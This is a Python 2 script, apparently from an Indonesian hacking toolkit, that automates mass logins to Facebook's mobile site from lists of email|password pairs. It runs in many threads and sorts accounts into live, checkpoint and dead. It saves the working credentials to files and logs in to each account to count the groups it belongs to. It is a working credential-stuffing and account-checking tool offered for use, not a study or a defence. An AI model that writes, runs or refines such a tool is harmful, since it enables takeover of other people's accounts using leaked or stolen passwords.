import os,re
import requests,bs4
from data import cache
from data.color import *
from multiprocessing.pool import ThreadPool
cache.cleanCache()
class chec:
	def __init__(self):
		if os.path.exists("out"):
			if os.path.exists("out/checkpoint.txt"):
				if os.path.getsize("out/checkpoint.txt") !=0:
					cek=raw_input('%s[!]%s file exists: out/%scheckpoint.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,N,R,N)).lower()
					if cek == "y":
						open("out/checkpoint.txt","w").close()
			else:open("out/checkpoint.txt","w").close()
		else:
			os.mkdir("out")
			open("out/checkpoint.txt","w").close()
		if os.path.exists("out"):
			if os.path.exists("out/live.txt"):
				if os.path.getsize("out/live.txt") !=0:
					cek=raw_input('%s[!]%s file exists: out/%slive.txt%s\n%s[?]%s replace? y/n): '%(R,N,G,N,R,N)).lower()
					if cek == "y":
						open("out/live.txt","w").close()
			else:open("out/live.txt","w").close()
		else:
			os.mkdir("out")
			open("out/live.txt","w").close()
			
def checke(akun):
	a=akun.split("|")
	r=requests.post(
		"https://mbasic.facebook.com/login.php",
	data=
		{
			"email":a[0],
			"pass":a[-1]
		},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
	).text
	if len(re.findall("/logout.php",r)) !=0 or len(re.findall("save-device",r)) !=0:
		print("[ \033[1;32mLIVE\033[0m ] %s|%s"%(a[0],a[-1]))
		if a[0] in open("out/live.txt").read():
			pass
		else:
			open("out/live.txt","a").write(
				"%s|%s\n"%(a[0],a[-1]))
	if len(re.findall("checkpoint",r)) !=0:
		print("[ \033[33mCHEK\033[0m ] %s|%s"%(a[0],a[-1]))
		if a[0] in open("out/checkpoint.txt").read():
			pass
		else:
			open("out/checkpoint.txt","a").write(
				"%s|%s\n"%(a[0],a[-1]))
	if len(re.findall("tidak cocok",r)) !=0 or len(re.findall("Anda menggunakan kata sandi lama",r)) !=0:
		print("[ \033[1;37m\033[31mDIEE\033[0m ] %s|%s"%(a[0],a[-1]))

def check():
	chec()
	print("%s[*]%s note: sparator |"%(G,N))
	try:
		o=open(raw_input('%s[?]%s list akun: '%(G,N))).read().splitlines()
		print("%s[*]%s Total account: %s"%(G,N,len(o)))
	except Exception as f:
		print("%s[!]%s %s"%(R,N,f))
		check()
	p=ThreadPool(input("[?] Thread: "))
	p.map(checke,o)
	exit()
	
	
## just cek

def checkek(akun):
	a=akun.split("|")
	r=requests.post(
		"https://mbasic.facebook.com/login.php",
	data=
		{
			"email":a[0],
			"pass":a[-1]
		},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
	).text
	if len(re.findall("/logout.php",r)) !=0 or len(re.findall("save-device",r)) !=0:
		print("[ \033[1;32mLIVE\033[0m ] %s|%s"%(a[0],a[-1]))
	if len(re.findall("checkpoint",r)) !=0:
		print("[ \033[33mCHEK\033[0m ] %s|%s"%(a[0],a[-1]))
	if len(re.findall("tidak cocok",r)) !=0 or len(re.findall("Anda menggunakan kata sandi lama",r)) !=0:
		print("[ \033[1;37m\033[31mDIEE\033[0m ] %s|%s"%(a[0],a[-1]))

def che():
	print("%s[*]%s note: sparator |"%(G,N))
	try:
		o=open(raw_input('%s[?]%s list akun: '%(G,N))).read().splitlines()
	except Exception as f:
		print("%s[!]%s %s"%(R,N,f))
		che()
	print("%s[*]%s Total account: %s"%(G,N,len(o)))
	p=ThreadPool(input("[?] Thread: "))
	p.map(checke,o)
	exit()


# Group Detector

fails=[]
class main:
	def __init__(self,akun):
		self.groupCount=[]
		self.akun=akun.split("|")
		self.req=requests.Session()
		self.i="https://mbasic.facebook.com/{}"
		self.login()
		
	def login(self):
		global fails
		s=self.req.post(self.i.format("login"),
		data=
			{
				"email":self.akun[-0],
				"pass":self.akun[-1]
			},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}
		).url
		if "save-device" in s or "m_sess" in s:
			self.gr(self.i.format("groups/?seemore"))
		else:
			fails.append("[!] %s|%s"%(
				self.akun[-0],self.akun[-1]))
			
	def gr(self,url):
		bs=bs4.BeautifulSoup(self.req.get(url).text,
			features="html.parser")
		for x in bs.find_all("a",href=True):
			if "groups" in x["href"]:
				if "category" in x["href"] or "create" in x["href"]:
					continue
				else:
					self.groupCount.append(self.i.format(
						x["href"]))
		if len(self.groupCount) !=0:
			print("[+] %s|%s -> %s%s group found.%s"%(
				self.akun[-0],self.akun[-1],G,
					len(self.groupCount),N))
		else:
			print("[!] %s|%s -> %sNO GROUP DETECTED.%s"%(
				self.akun[-0],self.akun[-1],R,N))
				
class index(object):
	def __init__(self):
		self.file()
		self.pool()
	
	def file(self):
		try:
			self.f=open(raw_input("[?] account list: ")).read().splitlines()
			print("%s[*]%s Total account: %s"%(G,N,len(self.f)))
		except Exception as e:
			print("[!] %s"%(e))
			return self.file()
			
	def pool(self):
		global fails
		try:
			self.p=ThreadPool(input("[?] Thread: "))
		except Exception as e:
			print("[!] %s"%(e))
			return self.pool()
		self.p.map(main,self.f)
		if len(fails) !=0:
			print "\n\n[+] failed login: %s"%(len(fails))
			for i in fails:
				print "%s"%(i)
			fails=[]

